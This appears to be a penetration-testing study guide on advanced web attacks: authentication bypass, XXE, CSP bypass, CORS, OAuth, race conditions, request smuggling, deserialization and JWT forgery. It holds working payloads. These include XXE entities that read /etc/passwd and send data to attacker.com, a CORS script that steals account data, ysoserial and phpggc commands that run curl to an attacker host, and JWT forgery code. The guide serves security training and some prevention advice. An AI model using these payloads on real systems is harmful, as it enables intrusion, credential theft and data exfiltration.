# Web Application — Advanced

!!! info "Why This Matters"
    Mid-level web testing is where the interesting vulnerabilities live. Basic SQLi and XSS are commodity findings that scanners catch. The vulnerabilities at this level — logic flaws, OAuth misconfiguration, JWT attacks, race conditions, HTTP request smuggling — require human understanding, cannot be fully automated, and are the findings that differentiate a good pentester from a tool operator.

---

## Authentication Bypass Techniques

### Type Juggling (PHP)

PHP performs loose type comparison with `==` that can be exploited when comparing JSON values to database values.

```php
// Vulnerable comparison
if ($token == $stored_token) { authenticate(); }

// PHP loose comparison: "0e12345" == "0e67890" → TRUE
// Both strings match the pattern 0e[digits] — PHP treats them as scientific notation
// 0e anything = 0, so 0 == 0 → true

// Attack: if token is stored as hash, find a hash that begins with 0e
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO")   = "0e830400451993494058024219903391"
// These two different strings have equal MD5 hashes under loose comparison

// For JSON type confusion
{"role": "admin", "count": 1}  →  {"role": "admin", "count": true}
// In PHP, (true == 1) is true — if role check uses ==, "true" as string vs bool
```

### Password Reset Flaws

**Token brute force:** If reset tokens are short, sequential, or time-based:
```python
# Time-based token: reset link sent at epoch 1700000000
# Token = md5(email + timestamp) where timestamp is predictable
# Brute force timestamps ±30 seconds around the request time
```

**Host header injection in password reset:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com          ← Attacker controls this
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```
If the application uses the Host header to build the reset link:
```
Reset your password: http://attacker.com/reset?token=abc123
```
Victim clicks the link → token goes to attacker's server.

**Email parameter pollution:**
```
email=victim@example.com&email=attacker@attacker.com
email=victim@example.com,attacker@attacker.com
```
Some mail handlers send to both addresses.

**Username enumeration through timing:** Checking if an account exists before sending reset email takes longer than for non-existent accounts — time difference leaks valid usernames.

### Multi-Step Authentication Bypass

Multi-step login (username → password → OTP) where steps aren't properly sequenced:
```
1. POST /login/step1 with username → gets token pointing to step2
2. POST /login/step2 with password → gets token pointing to step3 (OTP)
3. POST /login/step3 with OTP

# Attack: skip step 2 and go directly to step 3 with the step1 token
POST /login/step3
Cookie: step1_token=...

# Or: complete step1 with victim's username, complete step2 with your password for your own account
# Some implementations only track "step completed", not "step completed for this specific user"
```

---

## XXE — XML External Entity Injection

XXE occurs when XML input containing a reference to an external entity is processed by an XML parser with external entity processing enabled.

### Basic XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

If the application processes this XML and returns the data element in its response, `/etc/passwd` contents appear in the response.

### XXE Attack Vectors

**File read:**
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">       # Needs root
<!ENTITY xxe SYSTEM "file:///proc/self/environ"> # Environment variables
<!ENTITY xxe SYSTEM "file:///proc/self/cmdline"> # Process command line
<!ENTITY xxe SYSTEM "C:/Windows/win.ini">        # Windows
<!ENTITY xxe SYSTEM "C:/inetpub/wwwroot/web.config">  # IIS config
```

**SSRF via XXE:**
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
```

**Blind XXE (out-of-band data exfiltration):**
When the response doesn't include the entity content:
```xml
<!-- Trigger DNS lookup to confirm XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker-collaborator.com/">]>

<!-- Exfiltrate data via out-of-band HTTP request -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
```

**Blind XXE via error messages:**
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<!-- Error message: "file:///nonexistent/root:x:0:0..." — passwd contents in error -->
```

**XXE via file upload:** XML-based file formats processed server-side:
- Microsoft Office documents (DOCX, XLSX, PPTX) — ZIP archives containing XML
- SVG files
- RSS/Atom feeds
- SOAP requests

**XXE to RCE (rare):** Some PHP environments with expect:// wrapper, or specific Java parsers with script execution capabilities.

### Prevention

Disable external entity processing in the XML parser (language-specific):
```java
// Java SAXParserFactory
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Java DocumentBuilderFactory
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setExpandEntityReferences(false);
```

```python
# Python lxml
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

---

## Advanced XSS — CSP Bypass and DOM Sinks

### Content Security Policy (CSP)

CSP is a response header that restricts what scripts can execute on a page:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

**Common CSP bypass techniques:**

**JSONP endpoints on whitelisted domains:**
```
# If cdn.example.com hosts a JSONP endpoint:
<script src="https://cdn.example.com/jsonp?callback=alert(1)//"></script>
```

**Unsafe-inline (policy mistake):**
```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
# If unsafe-inline is present, inline scripts work: <script>alert(1)</script>
```

**Unsafe-eval:**
```
Content-Security-Policy: script-src 'self' 'unsafe-eval'
# If eval() is permitted, many DOM XSS sinks still work
```

**Whitelisted CDN with user-controlled content:**
```
# Policy: script-src https://ajax.googleapis.com
# GoogleAPIs allows Angular.js loading:
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

**Base tag injection:**
```html
<!-- If <base> can be injected before CSP loads, relative URLs resolve to attacker's origin -->
<base href="https://attacker.com/">
<script src="/evil.js"></script>
<!-- Loads https://attacker.com/evil.js -->
```

**DOM XSS Sinks to Test:**

```javascript
// High-risk sinks — execute code
document.write()
document.writeln()
element.innerHTML =
element.outerHTML =
eval()
setTimeout("string")
setInterval("string")
Function("string")()
window.location = "javascript:..."

// Medium-risk sinks — modify DOM
element.insertAdjacentHTML()
element.insertAdjacentElement()
$.html()      // jQuery
$(element)    // jQuery when element is user-controlled string

// Testing approach: search source code for these sinks, trace back which sources feed them
```

---

## CORS Misconfiguration

Cross-Origin Resource Sharing (CORS) controls which origins can make cross-origin requests and read responses.

**Vulnerable pattern 1: Reflecting Origin header:**
```http
Request:
Origin: https://attacker.com

Response:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```
This allows any origin to read responses — including credentialed requests (cookies, HTTP auth).

**Exploit:**
```javascript
// On attacker.com:
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://victim.com/api/account', true);
xhr.withCredentials = true;
xhr.onload = function() {
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(xhr.responseText));
};
xhr.send();
```

**Vulnerable pattern 2: Null origin accepted:**
```
Access-Control-Allow-Origin: null
```
Sandboxed iframes and data: URIs have `null` origin. Attackers can use iframes in their page:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://victim.com/api/data');
xhr.withCredentials = true;
xhr.onload = function() { top.location='https://attacker.com/?'+xhr.responseText; };
xhr.send();
</script>"></iframe>
```

**Vulnerable pattern 3: Subdomain wildcard:**
```
# Policy allows *.example.com but:
Access-Control-Allow-Origin: https://evil.example.com
```
If any subdomain is compromised (XSS, subdomain takeover), it can read responses from all other subdomains.

**Testing for CORS:**
```bash
# Add Origin header with different values, observe ACAO response header
curl -I -H "Origin: https://evil.com" https://target.com/api/data
curl -I -H "Origin: null" https://target.com/api/data
curl -I -H "Origin: https://target.com.evil.com" https://target.com/api/data
```

---

## OAuth 2.0 Vulnerabilities

OAuth 2.0 is an authorization framework widely used for "Login with Google/GitHub/Facebook" and API authorization.

### Core Flow (Authorization Code)

```
1. User clicks "Login with GitHub"
2. App redirects to GitHub: GET https://github.com/login/oauth/authorize
   ?client_id=abc&redirect_uri=https://app.com/callback&scope=user:email&state=xyz
3. User authenticates at GitHub, authorizes the app
4. GitHub redirects back: GET https://app.com/callback?code=AUTH_CODE&state=xyz
5. App exchanges code for token: POST https://github.com/login/oauth/access_token
   with code, client_id, client_secret
6. GitHub returns access_token
7. App uses access_token to call GitHub API
```

### Common Vulnerabilities

**Missing state parameter (CSRF):**
The `state` parameter is a random CSRF token for the OAuth flow. Without it:
```
1. Attacker initiates OAuth flow, gets the code
2. Attacker doesn't complete the flow (doesn't send code to app)
3. Attacker sends victim to: https://app.com/callback?code=ATTACKER_CODE
4. App exchanges attacker's code — victim's session is now linked to attacker's account
```
If the app doesn't validate `state`, the CSRF attack links victim's session to attacker's OAuth identity.

**Redirect URI validation flaws:**
```
# Exact match (secure):
redirect_uri=https://app.com/callback  # Only this exact URI allowed

# Prefix match (vulnerable):
# Any URI starting with https://app.com/ is accepted
redirect_uri=https://app.com/callback/../../logout  # Path traversal
redirect_uri=https://app.com.evil.com/callback     # Subdomain confusion

# Regex escape issues:
redirect_uri=https://app.com%40evil.com/callback   # @ confusion
```
If the redirect_uri can be manipulated to point to attacker-controlled URL, the `code` is leaked.

**Authorization code reuse:** Some implementations don't invalidate authorization codes after first use. If an attacker intercepts the code (e.g., via Referer header), they can use it.

**Token leakage via Referer:** If the access token appears in the URL (implicit flow) and the page loads external resources, the token appears in the Referer header of those requests.

**Scope escalation:** If the token validation doesn't check scope: obtain a token with limited scope, use it to call endpoints that should require higher scope.

---

## Race Conditions

Race conditions occur when the outcome depends on the timing of concurrent operations.

### Classic Race — Limit Enforcement Bypass

```
Application logic:
1. Check if user has already used coupon → No
2. Mark coupon as used
3. Apply discount

Attack: Send 20 simultaneous requests before step 2 completes
→ All 20 threads read "coupon not used" and proceed
→ Coupon applied 20 times
```

**Testing race conditions:**
```python
# Python — concurrent requests
import concurrent.futures
import requests

def use_coupon():
    return requests.post('https://target.com/apply-coupon', 
                        cookies={'session': 'victim_token'},
                        json={'coupon': 'SAVE50'})

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(use_coupon) for _ in range(20)]
    results = [f.result().status_code for f in futures]
    print(results)
```

**Burp Suite Turbo Intruder:** Send requests in parallel with synchronized timing:
```python
# Turbo Intruder race condition script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1,
                          pipeline=False)
    for _ in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### Race Conditions in File Operations

```python
# Time-of-Check to Time-of-Use (TOCTOU)
if os.path.exists(filename):      # Check
    with open(filename) as f:     # Use — attacker can replace file between check and use
        data = f.read()
```

### Double-Spend (Banking/Transfer)

```
# Simultaneously transfer same funds twice
Thread 1: Transfer $100 from Alice → Bob
Thread 2: Transfer $100 from Alice → Charlie
# If check and debit aren't atomic (database transaction), both succeed
```

---

## HTTP Request Smuggling

HTTP request smuggling exploits discrepancies in how front-end (load balancer/CDN) and back-end (application server) parse HTTP/1.1 request lengths.

### Content-Length vs Transfer-Encoding

```http
# CL.TE — Front-end uses Content-Length, Back-end uses Transfer-Encoding
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Front-end reads 13 bytes: `0\r\n\r\nSMUGGLED`. Passes to back-end.
Back-end uses chunked encoding: reads `0\r\n\r\n` (empty chunk = end). 
`SMUGGLED` is left in the back-end's buffer — it becomes the beginning of the next request.

**Impact:**
- Bypass security controls (WAF, authentication checks at front-end)
- Poison the request queue — affect other users' requests
- XSS via response poisoning
- Reveal front-end request headers (including internal headers)

**Testing:**
Use Burp Suite's HTTP Request Smuggler extension. Manual technique: timing attacks — an ambiguous smuggled request that causes the server to wait shows differential timing.

---

## Deserialization in Practice

### Java — Gadget Chain Exploitation

```bash
# Identify serialized Java objects in traffic
# Look for: base64 starting with 'rO0A' or raw bytes 0xACED0005

# Check which libraries are on classpath
# Common vulnerable gadget chains:
# - Commons Collections 3.1 / 4.0
# - Commons BeanUtils 1.9.2
# - Spring Framework
# - JBoss, WebLogic, WebSphere (often vulnerable out-of-box)

# ysoserial — generate payloads
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/?x=$(id)' | base64

# Test by replacing serialized object in:
# - Cookies (Java EE session cookies)
# - POST body
# - Custom protocol parameters

# Detect via timing (blind deserialization):
java -jar ysoserial.jar CommonsCollections6 'sleep 5' | base64
# If request takes 5 seconds longer: vulnerable
```

### PHP — Magic Methods

```php
# PHP serialization format:
# O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
# O = Object, 4 = class name length, "User" = class, 2 = properties

# Target magic methods: __wakeup(), __destruct(), __toString()

# Find classes with dangerous magic methods, construct object to exploit

# Example: class with __wakeup that includes a file
class Config {
    public $filename;
    public function __wakeup() {
        include($this->filename);  // File inclusion on deserialization
    }
}

# Payload: O:6:"Config":1:{s:8:"filename";s:19:"/etc/passwd";}
```

### Tools

```bash
# Burp Suite — identify serialized objects in traffic, replace with payloads
# Java Deserialization Scanner (Burp extension) — automated gadget chain testing
# ysoserial — Java payload generator
# phpggc — PHP gadget chain generator (equivalent of ysoserial for PHP)
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE1 exec 'curl http://attacker.com'
```

---

## JWT — Complete Attack Reference

### JWT Structure

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9  ← Header: {"alg":"RS256","typ":"JWT"}
.
eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ  ← Payload: {"sub":"user123","role":"user"}
.
SFlZ...signature  ← Signature
```

### Attack 1: None Algorithm

```python
import base64, json

def b64url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

header = b64url_encode(json.dumps({"alg":"none","typ":"JWT"}))
payload = b64url_encode(json.dumps({"sub":"user123","role":"admin","exp":9999999999}))
token = f"{header}.{payload}."  # Empty signature
```
Send this token — if the server accepts "alg:none", authentication is fully bypassed.

### Attack 2: Algorithm Confusion (RS256 → HS256)

When the server uses RS256 (asymmetric) but also accepts HS256 (symmetric):

```python
# 1. Obtain public key from /jwks.json or .well-known/openid-configuration
# 2. Craft HS256 token using PUBLIC KEY as the HMAC secret

import hmac, hashlib, base64, json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

public_key = open('public_key.pem', 'rb').read()  # Obtained from server

header = b64url_encode(json.dumps({"alg":"HS256","typ":"JWT"}))
payload = b64url_encode(json.dumps({"sub":"admin","role":"admin"}))
msg = f"{header}.{payload}"

sig = hmac.new(public_key, msg.encode(), hashlib.sha256).digest()
token = f"{msg}.{b64url_encode(sig)}"
```

### Attack 3: Key Confusion via JWKS Injection

```json
// If the JWT header accepts 'jku' or 'x5u' pointing to a key URL:
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}

// Host your own JWKS with your key pair
// Sign the JWT with your private key
// Server fetches JWK from attacker URL and verifies — your token passes
```

### Attack 4: Kid Injection

```json
// 'kid' (key ID) header sometimes used in SQL queries or file paths:
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
// If kid is used as: SELECT secret FROM keys WHERE id='kid'
// SQL injection: {"kid":"x' UNION SELECT 'attacker_secret'--"}
// Or path traversal: sign with empty file content as key
```

### Tools

```bash
# jwt_tool — comprehensive JWT testing
jwt_tool <token> -t https://target.com/protected
jwt_tool <token> -X a    # Test none algorithm
jwt_tool <token> -X s    # Test algorithm substitution

# hashcat for weak secret cracking
hashcat -m 16500 token.txt /wordlists/rockyou.txt
```
